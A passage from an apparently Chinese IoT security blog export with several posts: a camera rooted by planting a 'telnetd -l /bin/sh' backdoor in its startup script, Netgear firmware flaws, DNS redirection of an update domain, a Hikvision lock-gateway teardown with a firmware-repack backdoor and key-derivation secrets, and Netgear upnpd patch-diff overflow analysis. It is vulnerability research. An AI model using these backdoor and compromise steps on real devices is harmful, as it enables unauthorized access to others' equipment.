class="line">authority.ini           mvsound                 venc.cfg</span><br><span class="line">dns_last_serverips.ini  network_Info.ini        vg_boot.sh</span><br><span class="line">h265_1920x1080.cfg      nvconfig.ini            vsipbroadcast</span><br><span class="line">idcheck.sh              nvipcstart.sh           wificonf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 修改系统自启程序，实现常驻</span></span><br><span class="line">/mnt/mtd <span class="comment"># cat nvipcstart.sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">hostname V380E</span><br><span class="line">/sbin/telnetd -p 2323 -l /bin/sh &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 umount（是否必要？）</span></span><br><span class="line"><span class="comment"># 实测reboot不行</span></span><br><span class="line">/mnt <span class="comment"># umount /mnt/mtd</span></span><br><span class="line">/mnt <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">/mnt <span class="comment"># reboot</span></span><br><span class="line">/mnt <span class="comment"># ls</span></span><br><span class="line">mtd     nand    sdcard</span><br></pre></td></tr></table></figure>
<ul>
<li>telnet连接</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 再次进入uboot，将bootargs复原</span></span><br><span class="line">U-Boot 2013.10.0-AK_V3.0.08 (Mar 05 2019 - 15:37:04)</span><br><span class="line">Hit any key to stop autoboot:  3</span><br><span class="line"> 0</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$setenv</span> bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line">anyka<span class="variable">$saveenv</span></span><br><span class="line"></span><br><span class="line">Saving Environment to SPI Flash...</span><br><span class="line">Env save <span class="keyword">done</span> OK</span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 实测reset无效</span></span><br><span class="line">anyka<span class="variable">$reset</span></span><br><span class="line">           resetting ...</span><br><span class="line">heartbeat = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 再次启动，uboot可正常引导系统</span></span><br><span class="line"><span class="comment"># telnet连接</span></span><br><span class="line">lxl@192  ~  telnet 192.168.0.106 2323</span><br><span class="line">Trying 192.168.0.106...</span><br><span class="line">Connected to 192.168.0.106.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Netgear固件中的多个漏洞</title>
    <url>/2021/09/21/iot/Netgear%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="Netgear固件中的多个漏洞"><a href="#Netgear固件中的多个漏洞" class="headerlink" title="Netgear固件中的多个漏洞"></a>Netgear固件中的多个漏洞</h1><ul>
<li><p>概要：三个漏洞即：认证绕过、旁路攻击获取密码、密钥硬编码</p>
</li>
<li><p>文件系统，关注点</p>
<ul>
<li>/www：html页面和.gif图片</li>
<li>/usr/sbin：各种自定义二进制文件，包括 HTTPd、FTPC 等</li>
</ul>
</li>
<li><p>httpd</p>
<ul>
<li>32 位大端 MIPS ELF</li>
<li>针对 uClibc (嵌入式设备的标准 libc）编译</li>
<li>整个服务器端逻辑 (CGI) 都被编译到其中（通过内部字符串推测，如accessCgi_xxx）</li>
</ul>
</li>
<li><p>嵌入式web服务，关注点</p>
<ul>
<li>gif等静态资源，一般不需要身份验证即可访问，怎么处理的？</li>
<li>如何执行身份验证？</li>
<li>是否正确处理请求（即是否存在内存损坏错误）？</li>
<li>是否实施了某些安全措施，例如（反）跨站点请求伪造令牌或内容安全策略？</li>
</ul>
</li>
<li><p>认证绕过</p>
<ul>
<li>strcmp来处理form.css等文件、strstr来处理js等后缀，前者问题不大，后者可绕过</li>
<li>对应关注点：一些不需身份验证的页面怎么处理的</li>
<li>若先认证，再strstr处理js后缀，则不可，如扩展中其它型号</li>
</ul>
</li>
<li><p>旁路攻击</p>
<ul>
<li>如何身份验证？user+pass、base64、http-header发送、与nvram中的对比</li>
<li>username/password使用strcmp处理，strcmp 在 libc 中的实现是通过逐个字符比较直到观察到 NUL 终止符或直到发生不匹配来工作</li>
<li>可以通过测量失败所需的时间来利用：第一个字符时为n时，时间最长，因此为n（若非n则立刻停止，若n则查第二个，时间长）可以重复此过程，直到泄露整个密码。</li>
<li>基于 XOR 的内存比较来避免此类攻击，即使字节不匹配，该功能也会继续，即所花时间相等，OpenSSL的CRYPTO_memcmp就是这么实现的</li>
<li>对应关注点：如何执行身份验证？</li>
</ul>
</li>
<li><p>密钥硬编码</p>
<ul>
<li>备份/恢复功能，对应配置文件，高熵，被加密的</li>
<li>逆向，发现des加密及硬编码的密钥</li>
<li>同一个设备，一般加密方式是一样的，即能够解密配置文件的，也适用于nvram，能够解密获取password</li>
</ul>
</li>
<li><p>其它</p>
<ul>
<li><p>ent指令查看熵，同binwalk -E（ent是啥？）</p>
</li>
<li><p>nm 命令显示指定File 中符号的信息</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/246028" target="_blank" rel="noopener">https://www.anquanke.com/post/id/246028</a></li>
<li><a href="https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/" target="_blank" rel="noopener">https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>流量劫持漏洞-修改dns</title>
    <url>/2021/09/19/iot/%E6%B5%81%E9%87%8F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E-%E4%BF%AE%E6%94%B9dns/</url>
    <content><![CDATA[<p>[toc]</p>
<blockquote>
<p>测试设备流量劫持漏洞时，需要更改dns，现记录如下</p>
</blockquote>
<h2 id="流量劫持漏洞-修改dns"><a href="#流量劫持漏洞-修改dns" class="headerlink" title="流量劫持漏洞-修改dns"></a>流量劫持漏洞-修改dns</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 Ubuntu 桥接模式，有线，保证有网</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 lxl@ubuntu:/mnt/hgfs/3/dns$ sudo ./dnschange.sh</span></span><br><span class="line"><span class="comment"># ip是否正确</span></span><br><span class="line">the ip is: 192.168.0.104</span><br><span class="line">10.10.10.1, is right [Y/n]?</span><br><span class="line"><span class="comment"># dnsmasq安装失败</span></span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  dnsmasq</span><br><span class="line">0 upgraded, 1 newly installed, 0 to remove and 194 not upgraded.</span><br><span class="line">Need to get 16.2 kB of archives.</span><br><span class="line">E: Failed to fetch http://mirrors.aliyun.com/ubuntu/pool/universe/d/dnsmasq/dnsmasq_2.79-1ubuntu0.4_all.deb  Could not resolve <span class="string">'security.ubuntu.com'</span></span><br><span class="line">E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?</span><br><span class="line"><span class="comment"># dnsmasp启动失败</span></span><br><span class="line">Failed to restart dnsmasq.service: Unit dnsmasq.service not found.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 sudo apt install dnsmasq</span></span><br><span class="line">安装后会自动启动</span><br><span class="line">启动失败，bad option at line 2 of /etc/dnsmasq.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4  subl /etc/dnsmasq.conf</span></span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ cat /etc/dnsmasq.conf</span><br><span class="line">address=/aaa.com/192.168.0.104</span><br><span class="line">10.10.10.1</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ subl /etc/dnsmasq.conf</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ cat /etc/dnsmasq.conf</span><br><span class="line">address=/aaa.com/192.168.0.104</span><br><span class="line">address=/ipcupdate.av380.net/192.168.0.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 启动nginx、dnsmasq</span></span><br><span class="line">sudo service nginx status</span><br><span class="line">sudo service dnsmasq status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 win7测试，修改本机dns</span></span><br><span class="line"><span class="comment"># 修改前</span></span><br><span class="line">C:\Users\lxl&gt;ping aaa.com</span><br><span class="line">正在 Ping aaa.com [45.60.62.121] 具有 32 字节的数据:</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line"><span class="comment"># 修改后</span></span><br><span class="line">C:\Users\lxl&gt;ping aaa.com</span><br><span class="line">正在 Ping aaa.com [192.168.0.104] 具有 32 字节的数据:</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 测试dns，修改路由器dns</span></span><br><span class="line">原-router-ip、改-192.168.0.104（dnsmasq所在）</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>海康智能门锁的安全分析</title>
    <url>/2021/08/29/iot/%E6%B5%B7%E5%BA%B7%E6%99%BA%E8%83%BD%E9%97%A8%E9%94%81%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="海康智能门锁的安全分析"><a href="#海康智能门锁的安全分析" class="headerlink" title="海康智能门锁的安全分析"></a>海康智能门锁的安全分析</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><ul>
<li><p>概要：flash中提取固件、软排线中找到UART</p>
</li>
<li><p>设备</p>
<ul>
<li>对门锁配套的网关进行分析（最新版已取消外置网关）</li>
<li>门锁和网关已经是配对状态，无需额外操作</li>
<li>门锁app对服务端有证书校验，故不可直接抓包</li>
</ul>
</li>
<li><p>网关与服务器通信（监控交换机端口来抓包）</p>
<ul>
<li>上电后，与litedev.ys7.com通信，获取另一个ip-101</li>
<li>随后与101通信，前者通信终止</li>
<li>与101的通信加密，无太多可见明文</li>
</ul>
</li>
<li><p>拆设备找固件所在芯片</p>
<ul>
<li>中间的MCU：MEDIATEK MT7688AN，联发科，手册中是SPI flash，即没有内置Flash，而是SPI通信的外置Flash（若有内置flash则固件就从mcu中提取？）</li>
<li>MCU上方：Winbond W9751G6KB芯片，DDR2 SDRAM，断电丢数据，固件不可能在里面</li>
<li>MCU下方有两个：PCM5100A（音频相关）、GD25Q127CSIG（128M的Flash，固件文件位于此）</li>
</ul>
</li>
<li><p>读取Flash</p>
<ul>
<li>取下芯片放在编程器上：热风枪/电烙铁 + 镊子（烧录夹可以不取下）</li>
<li>配套软件来配置：Flash品牌和型号、大小（自动识别或手动选择）</li>
<li>读出Flash：将读出的数据保存为文件</li>
</ul>
</li>
<li><p>binwalk提取</p>
<ul>
<li>包含一个嵌入式Linux系统，网关的功能一定由某个程序完成</li>
<li>共5个文件系统：2个squashfs、2个cpio（LZMA解压而得）、1个jffs2</li>
<li>jffs2：保存门锁及网关信息，如id</li>
<li>2个cpio：恢复出厂设置的备份文件系统、当前正使用的文件系统</li>
<li>2个squashfs：全部是mp3文件、网关的主程序（分析目标）</li>
</ul>
</li>
<li><p>UART</p>
<ul>
<li>一般MCU都会提供UART引脚，手册中可见该芯片提供两个：UART0和UART1</li>
<li>UART引脚在左侧的软排线接口，并非单独的，通过万用表找到rx和tx</li>
</ul>
</li>
<li><p>其它</p>
<ul>
<li>固件获取：app抓包失败、官网下载失败，只好硬件方式（从Flash中提取）</li>
<li>GD官网查询Flash详细参数，<a href="https://www.gigadevice.com/zh-hans/flash-memory/gd25q127c/" target="_blank" rel="noopener">https://www.gigadevice.com/zh-hans/flash-memory/gd25q127c/</a></li>
<li>疑问：如果没有外置flash，而mcu有内置flash，则固件在mcu中？</li>
<li>读取flash：取下/不取下两种方式</li>
</ul>
</li>
</ul>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><ul>
<li><p>概要：连接并登录串口、固件重打包/烧录、获取持久化后门</p>
</li>
<li><p>连接串口</p>
<ul>
<li>20pin的软排线：一端连接设备，另一端连接转接板（0.5mm转2.54mm）</li>
<li>usb转ttl模块：连接pc和转接板，只关注5个引脚中的RXD/TXD/GND</li>
<li>PC：设备管理器-端口中出现COM-xxx，Xshell作为串口工具</li>
<li>xshell：可输出日志，也可输入尝试登录</li>
</ul>
</li>
<li><p>持久化后门</p>
<ul>
<li>串口登录：找到/etc/shadow，获取帐号密码（彩虹表）</li>
<li>telnetd：每次设备重启后，都需要进入shell并重新启动，麻烦</li>
<li>自启动脚本：squashfs中initrun.sh</li>
<li>步骤：文件系统重打包、文件系统放回固件、固件刷回flash</li>
</ul>
</li>
<li><p>文件系统重打包</p>
<ul>
<li>需重新打包squashfs，mksquashfs需要正确的参数、程序版本，</li>
<li>参考官方SDK：image.mk中发现打包命令</li>
<li>mksquashfs4：-comp xz指定压缩格式（binwalk也可见是xz）</li>
</ul>
</li>
<li><p>文件系统放回至固件</p>
<ul>
<li>直接16进制编辑，新的覆盖旧的，偏移0x7000000</li>
<li>注意：填充字节，保证另一个squashfs的偏移不变</li>
</ul>
</li>
<li><p>固件烧录：同提取类似，将Flash取下，通过编程器及配套软件，将新固件烧录至Flash</p>
</li>
<li>其它<ul>
<li>usb转ttl模块：转换MCU-ttl、usb-RS232二者的逻辑电平</li>
<li>给网关准备一个带开关的插座，便于反复重启，来回插拔容易导致问题</li>
<li>软排线触点可能有点虚接，硬件连接不稳定，最好软件连接，如telnet</li>
<li>有的设备只能识别特定版本的mksquashfs打包出来的固件</li>
</ul>
</li>
</ul>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><ul>
<li>概要：程序patch、日志分析、动态调试</li>
<li>其它<ul>
<li>ps+排除法，确定主程序/dav/davinci</li>
<li>MQTT：构建于TCP/IP协议之上、轻量级通信协议、用于iot中设备与云端的通信</li>
</ul>
</li>
<li>watchdog<ul>
<li>davinci启动后，初始化一个线程，不断向watchdog进行写操作</li>
<li>若watchdog没收到数据，就以为davinci死掉，设备就会重启</li>
<li>绕过：patch掉此线程，写脚本FeedWatchdog.sh，死循环echo&gt;watchdog，一直喂狗防重启</li>
</ul>
</li>
<li><p>程序patch/上传/启动</p>
<ul>
<li>patch：日志修复、喂狗线程</li>
<li>上传：硬件法-固件烧录、软件法-tftp</li>
<li>启动：运行FeedWatchdog.sh喂狗、终止旧davinci并删除pidfile（互斥体用于控制davinci仅运行一次）、启动新程序</li>
</ul>
</li>
<li><p>日志分析</p>
<ul>
<li>有运行日志，但输出不全，patch程序，跳过对日志严重程度的判断</li>
<li>日志文件输出到文件（devlog目录），而非命令行</li>
<li>字符串”litedev.ys7.com”：网关上电后第一个访问的地址，ip-115</li>
<li>字符串”mqtt connect succ”：与MQTT服务器通信，ip-101</li>
<li>字符串“lbs_connect”：搜索文件系统，是libmicrokernel.so中的函数</li>
</ul>
</li>
<li><p>设备的工作流程</p>
<ul>
<li>结合：日志内容、抓包结果</li>
<li>先与litedev.ys7.com通信，获取MQTT服务器的地址</li>
<li>再与MQTT服务器通信，实现设备的逻辑功能</li>
</ul>
</li>
<li><p>调试工具</p>
<ul>
<li>gdb/gdbserver，适用于嵌入式Linux</li>
<li>可gdb进行本地调试，但其体积过大，嵌入式系统资源有限，故通过gdbserver进行远程调试</li>
</ul>
</li>
<li><p>获取gdbserver</p>
<ul>
<li>官方提供，但无法使用</li>
<li>直接找已编译好的，如rapid7-github</li>
</ul>
</li>
<li><p>调试步骤</p>
<ul>
<li>gdbserver启动davinci（附加进程方式会错过通信）</li>
<li>gdb-multiarch作为远程调试器（IDA提供图形界面，但会有莫名错误）</li>
<li>运行gdb-multiarch：set architecture、file读取符号文件、break设置断点、target连接gdbserver、continue执行程序</li>
</ul>
</li>
</ul>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><ul>
<li><p>概要：设备密钥体系（3个密钥）、认证方式及密钥生成</p>
</li>
<li><p>网关通信的3个密钥</p>
<ul>
<li>share key：网关与litedev服务器共有的密钥，设备序列号等常量MD5运算得到，每个设备独有的</li>
<li>master key：网关与litedev服务器经过密钥协商而来，用于加密传输session key</li>
<li>session key：网关与MQTT服务器通信时的加密密钥，由litedev服务器直接下发</li>
</ul>
</li>
<li><p>密钥的级别/生存周期</p>
<ul>
<li>share key：与设备绑定且固定不变的，一旦获取就可完成所有的认证过程</li>
<li>master key：app绑定网关时，密钥协商生成的，绑定一次就更新一次</li>
<li>session key：运行davinci则更新，即重启设备就更新</li>
</ul>
</li>
<li><p>数据格式共5部分</p>
<ul>
<li>common：固定的3字节</li>
<li>dev_subserial/dev_subserial_len：设备序列号及长度</li>
<li>random_1：1字节随机数，每次密钥协商时都不同，网关将其上传至litedev服务器</li>
<li>digital_sign：32字节，由于random_1不同而不同，故每次通信都33字节不同</li>
</ul>
</li>
<li><p>4个随机数</p>
<ul>
<li>网关和服务器共同步了4个随机数，send_authentication_i/ii/iii/iv四个函数</li>
<li>保存于lbs_affair结构体中，1/3网关生成发送服务器、2/4由服务器生成发给网关</li>
</ul>
</li>
<li><p>master key生成</p>
<ul>
<li>generate_masterkey函数</li>
<li>4个随机数 + share key，sha512函数 </li>
</ul>
</li>
<li><p>session key生成：</p>
<ul>
<li>aes cbc算法、master key为密钥</li>
<li>获取session key后，后续通信就用session key而非master</li>
</ul>
</li>
<li><p>share key生成</p>
<ul>
<li>generate_sharekey函数</li>
<li>dev_subserial + dev_verification_code + 固定的盐，多次MD5而得</li>
<li>dev_verification_code：设备的认证码，设备背面的标签上</li>
<li>盐：<a href="http://www.88075998.com，中间是联系电话" target="_blank" rel="noopener">www.88075998.com，中间是联系电话</a></li>
</ul>
</li>
<li>其它<ul>
<li>为了触发密钥协商，先删除当前master-key，即dev_masterkey文件</li>
<li>对比发送数据（本次gdb调试的与上次wireshark抓包的），不同部分就是密钥协商的关键</li>
</ul>
</li>
</ul>
<blockquote>
<p> 参考：</p>
<ul>
<li><a href="https://www.4hou.com/posts/DPxy" target="_blank" rel="noopener">https://www.4hou.com/posts/DPxy</a></li>
<li><a href="https://www.4hou.com/posts/EGyY" target="_blank" rel="noopener">https://www.4hou.com/posts/EGyY</a></li>
<li><a href="https://www.4hou.com/posts/GgAL" target="_blank" rel="noopener">https://www.4hou.com/posts/GgAL</a></li>
<li><a href="https://www.4hou.com/posts/KmGM" target="_blank" rel="noopener">https://www.4hou.com/posts/KmGM</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>智能门锁</tag>
      </tags>
  </entry>
  <entry>
    <title>补丁对比技术实践-netgear</title>
    <url>/2021/08/27/iot/%E8%A1%A5%E4%B8%81%E5%AF%B9%E6%AF%94%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5-netgear/</url>
    <content><![CDATA[<p>[toc]</p>
<p># </p>
<h1 id="netgear"><a href="#netgear" class="headerlink" title="netgear"></a>netgear</h1><p><a href="https://www.anquanke.com/search?s=netgear#" target="_blank" rel="noopener">https://www.anquanke.com/search?s=netgear#</a></p>
<h2 id="1-CVE-2020-25067"><a href="#1-CVE-2020-25067" class="headerlink" title="1-CVE-2020-25067"></a>1-CVE-2020-25067</h2><blockquote>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25067" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25067</a></p>
<p><a href="https://www.anquanke.com/post/id/217606#h2-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217606#h2-5</a></p>
<p>NETGEAR R8300 devices before 1.0.2.134 are affected by command injection by an unauthenticated attacker.</p>
</blockquote>
<ol>
<li><p>Netgear R8300</p>
</li>
<li><p>130 vs 134</p>
</li>
<li><p>/usr/sbin/upnpd</p>
</li>
<li><p>漏洞函数sub_25E04，bindiff记录</p>
<p> 0.9754899942076298    0.976487163398695    </p>
<p> 00025E04    sub_00025E04    Normal    </p>
<p> 00025B88    sub_00025B88    Normal    </p>
<p> 0    52    0    0    86    0</p>
</li>
<li><p>bindiff中，只有两个黄色节点，第一个多了memset，第二个strcpy变为strcncpy</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-10-093948.jpg" alt="image-20201210110523659"></p>
</li>
</ol>
<h2 id="2-CVE-2020-9373-here"><a href="#2-CVE-2020-9373-here" class="headerlink" title="2-CVE-2020-9373//here"></a>2-CVE-2020-9373//here</h2><blockquote>
<p><a href="https://www.freebuf.com/vuls/228293.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/228293.html</a></p>
<p>Netgear R6400 多个固件版本中的upnpd存在栈溢出漏洞(CVE-2020-9373)，通过向其udp 1900端口发送构造的ssdp数据包，可能导致DOS或RCE。下文的测试均使用V1.0.1.52_1.0.36这本版本的固件包。**</p>
</blockquote>
<ol>
<li><p>Netgear R6400</p>
</li>
<li><p>52 vs 62</p>
</li>
<li><p>/usr/sbin/upnpd</p>
</li>
<li><p>漏洞函数sub_22270，bindiff记录</p>
<p> 0.9748371200983247    0.976487163398695    </p>
<p> 00022270    sub_00022270    Normal    </p>
<p> 00022038    sub_00022038    Normal    </p>
<p> 0    52    0    0    85    0</p>
</li>
<li><p>bindiff中，只有两个黄色节点，第一个多了memset，第二个strcpy变为strcncpy</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-10-093946.jpg" alt="image-20201210140923234"></p>
</li>
</ol>
<h2 id="3-PSV-2019-0296"><a href="#3-PSV-2019-0296" class="headerlink" title="3-PSV-2019-0296"></a>3-PSV-2019-0296</h2><blockquote>
<p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-704/" target="_blank" rel="noopener">https://www.zerodayinitiative.com/advisories/ZDI-20-704/</a></p>
<p><a href="https://www.anquanke.com/post/id/209232v" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209232v</a></p>
<p>​     This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR R6700 routers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed.</p>
<p>​    The specific flaw exists within the UPnP service, which listens on TCP port 5000 by default. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root.</p>
<p>可以看到，在<code>V1.0.4.92</code>补丁版本中，在调用<code>memcpy()</code>之前增加了一个长度校验，很有可能这里就是漏洞修复点。两个函数对应的伪代码如下，在补丁版本中，除了增加对<code>memcpy()</code>长度参数的校验外，<code>sscanf()</code>的格式化参数也发生了变化，可能在调用<code>sscanf()</code>时就会出现溢出。另外，结合该函数中的字符串<code>sa_setBlockName</code>，与<code>ZDI</code>漏洞公告中的描述相符，因此猜测这里就是栈溢出漏洞点。</p>
</blockquote>
<ol>
<li>netgear R6400v2</li>
<li>82 vs 98（离82最近的84并没有修复</li>
<li>/usr/sbin/upnpd</li>
</ol>
<h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><p>漏洞函数sub_24B8C</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0.9237779224104561	0.9754411650846722	</span><br><span class="line">00024B8C	sub_00024B8C	Normal	</span><br><span class="line">00024ACC	sub_00024ACC	Normal	</span><br><span class="line">0	10	1	1	14	3</span><br></pre></td></tr></table></figure>
<p>第一个sscanf的format变了，(v3, “%d%s”, &amp;v15, &amp;v13)变为(v3, “%d”, &amp;v14)</p>
<p>第二个多了一个节点，对memcpy的n作了限制</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-12-15-081339.jpg" alt="image-20201215150351281"></p>
<h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>溢出点是sscanf函数，v13对应的%s，直到00，而其只占4</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_24B8C</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// int类型，在栈中占4个字节</span></span><br><span class="line">  v3 = a1;<span class="comment">//源来自参数1</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">sscanf</span>(v3, <span class="string">"%d%s"</span>, &amp;v15, &amp;v13) == <span class="number">2</span> )<span class="comment">//3到15和13，15没问题，因为%d限制了只4字节，但13对应的%s，直到00才停</span></span><br></pre></td></tr></table></figure>
<p>sub_24B8C的参数1来自sub_25640的参数1</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_25640</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  haystack = a1;<span class="comment">//haystack来自参数1</span></span><br><span class="line">  v3 = <span class="built_in">strstr</span>(haystack, <span class="string">":Body&gt;"</span>);<span class="comment">//3来自haystack</span></span><br><span class="line">  v74 = v3 + <span class="number">6</span>;<span class="comment">//74来自3</span></span><br><span class="line">    v8 = <span class="built_in">strstr</span>(v74, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);<span class="comment">//8来自74</span></span><br><span class="line">    v9 = <span class="built_in">strchr</span>(v8, <span class="number">62</span>);<span class="comment">//9来自8</span></span><br><span class="line">    src = v9 + <span class="number">1</span>;<span class="comment">//src来自v9</span></span><br><span class="line">        <span class="keyword">return</span> sub_24B8C(src, (<span class="keyword">int</span>)buf);<span class="comment">//参数1来自src</span></span><br></pre></td></tr></table></figure>
<p>sub_38934调用了sub_25640，从代码中推断出sub_25640的参数1可能为http内容</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v6 = a2;<span class="comment">//来自参数2                         </span></span><br><span class="line">v66 = (_BYTE *)stristr(v6, <span class="string">"&lt;/Username&gt;"</span>);</span><br><span class="line">v70 = (_BYTE *)stristr(v6, <span class="string">"&lt;/Password&gt;"</span>);</span><br><span class="line">v74 = (<span class="keyword">const</span> <span class="keyword">char</span> *)stristr(v6, <span class="string">"Cookie:"</span>);      </span><br><span class="line">v13 = <span class="built_in">strstr</span>(v6, <span class="string">"SessionID"</span>);<span class="comment">//根据字符串大概推断出       </span></span><br><span class="line">v8 = sub_25640(v6, v92);<span class="comment">//参数1是v6</span></span><br></pre></td></tr></table></figure>
<p>一直向上回溯，最终找到malloc函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_3B7E0</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3, <span class="keyword">signed</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v4 = a1;</span><br><span class="line">	v18 = (<span class="keyword">const</span> <span class="keyword">char</span> *)stristr(v4, <span class="string">"Cookie:"</span>);</span><br><span class="line">  v19 = (<span class="keyword">const</span> <span class="keyword">char</span> *)stristr(v4, <span class="string">"SOAPAction:"</span>);</span><br><span class="line">  v31 = stristr(v4, <span class="string">"urn:"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_38934(v86, v4, v5, v7, v6) &gt; <span class="number">1</span> )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_224B4</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> *a4, <span class="keyword">signed</span> <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v6 = a2;</span><br><span class="line">	result = sub_3B7E0(v6, v7, v8, a5);</span><br><span class="line">&#125;</span><br><span 